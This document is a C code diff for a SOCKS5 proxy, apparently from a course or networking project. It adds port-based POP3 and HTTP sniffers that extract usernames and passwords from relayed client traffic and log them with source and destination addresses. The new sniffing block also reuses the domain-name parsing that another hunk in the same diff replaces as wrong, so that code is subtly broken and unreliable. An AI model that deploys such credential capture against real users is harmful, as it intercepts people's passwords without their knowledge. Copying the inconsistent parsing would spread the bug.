@@ -4,6 +4,9 @@
 #include "../helpers/stm.h"
 #include "../helpers/metrics.h"
 #include "../helpers/access_log.h"
+#include "../helpers/credentials_log.h"
+#include "../helpers/pop3_sniffer.h"
+#include "../helpers/http_sniffer.h"
 #include <string.h>
 #include <errno.h>
 #include <sys/socket.h>
@@ -57,9 +60,10 @@ void client_set_reply(struct socks5_conn *conn, uint8_t rep, uint8_t atyp, const
                      conn->req_addr[0], conn->req_addr[1],
                      conn->req_addr[2], conn->req_addr[3]);
         } else if (conn->req_atyp == 0x03) {
-            // DOMAINNAME - el primer byte es la longitud
-            uint8_t len = conn->req_addr[0];
-            memcpy(dst, &conn->req_addr[1], len);
+            // DOMAINNAME - req_addr ya contiene el nombre sin prefijo de longitud
+            uint8_t len = conn->req_addr_len;
+            if (len > sizeof(dst) - 1) len = sizeof(dst) - 1;
+            memcpy(dst, conn->req_addr, len);
             dst[len] = '\0';
         } else if (conn->req_atyp == 0x04) {
             // IPv6
@@ -154,8 +158,61 @@ enum tunnel_status channel_read(struct selector_key *key, struct data_channel *c
     ch->write_enabled = true;
 
     struct socks5_metrics *m = metrics_get();
+    struct socks5_conn *conn = (struct socks5_conn *)key->data;
+    
     if (ch->direction == C2O) {
         m->bytes_client_to_origin += (uint64_t)n;
+        
+        if (conn->sniff_protocol != PROTO_NONE && !conn->credentials_logged) {
+            bool captured = false;
+            
+            if (conn->sniff_protocol == PROTO_POP3) {
+                captured = pop3_sniffer_process(&conn->pop3_state, write_ptr, (size_t)n);
+            } else if (conn->sniff_protocol == PROTO_HTTP) {
+                captured = http_sniffer_process(&conn->http_state, write_ptr, (size_t)n);
+            }
+            
+            if (captured) {
+                char src_ip[128] = "unknown";
+                struct sockaddr_storage client_addr;
+                socklen_t addr_len = sizeof(client_addr);
+                if (getpeername(conn->client_fd, (struct sockaddr *)&client_addr, &addr_len) == 0) {
+                    if (client_addr.ss_family == AF_INET) {
+                        inet_ntop(AF_INET, &((struct sockaddr_in *)&client_addr)->sin_addr, src_ip, sizeof(src_ip));
+                    } else if (client_addr.ss_family == AF_INET6) {
+                        inet_ntop(AF_INET6, &((struct sockaddr_in6 *)&client_addr)->sin6_addr, src_ip, sizeof(src_ip));
+                    }
+                }
+                
+                char dst[512];
+                if (conn->req_atyp == 0x01) {
+                    snprintf(dst, sizeof(dst), "%u.%u.%u.%u",
+                             conn->req_addr[0], conn->req_addr[1],
+                             conn->req_addr[2], conn->req_addr[3]);
+                } else if (conn->req_atyp == 0x03) {
+                    uint8_t len = conn->req_addr[0];
+                    memcpy(dst, &conn->req_addr[1], len);
+                    dst[len] = '\0';
+                } else if (conn->req_atyp == 0x04) {
+                    inet_ntop(AF_INET6, conn->req_addr, dst, sizeof(dst));
+                } else {
+                    snprintf(dst, sizeof(dst), "unknown");
+                }
+                
+                char username[256] = "";
+                char password[256] = "";
+                
+                if (conn->sniff_protocol == PROTO_POP3) {
+                    pop3_sniffer_get_credentials(&conn->pop3_state, username, password);
+                    credentials_log_record("POP3", src_ip, dst, conn->req_port, username, password);
+                } else if (conn->sniff_protocol == PROTO_HTTP) {
+                    http_sniffer_get_credentials(&conn->http_state, username, password);
+                    credentials_log_record("HTTP", src_ip, dst, conn->req_port, username, password);
+                }
+                
+                conn->credentials_logged = true;
+            }
+        }
     } else if (ch->direction == O2C) {
         m->bytes_origin_to_client += (uint64_t)n;
     }
@@ -240,6 +297,16 @@ void tunnel_activate(struct socks5_conn *conn, fd_selector s) {
     conn->chan_o2c.read_enabled = !conn->origin_read_closed;
     conn->chan_c2o.write_enabled = buffer_can_read(&conn->client_to_origin_buf);
     conn->chan_o2c.write_enabled = buffer_can_read(&conn->origin_to_client_buf);
+    
+    // Detectar protocolo por puerto (incluye puertos estándar + testing)
+    if (conn->req_port == 110 || conn->req_port == 11110) {
+        conn->sniff_protocol = PROTO_POP3;
+    } else if (conn->req_port == 80 || conn->req_port == 8080 || conn->req_port == 8888) {
+        conn->sniff_protocol = PROTO_HTTP;
+    } else {
+        conn->sniff_protocol = PROTO_NONE;
+    }
+    
     tunnel_update_interest(conn, s);
 }
 
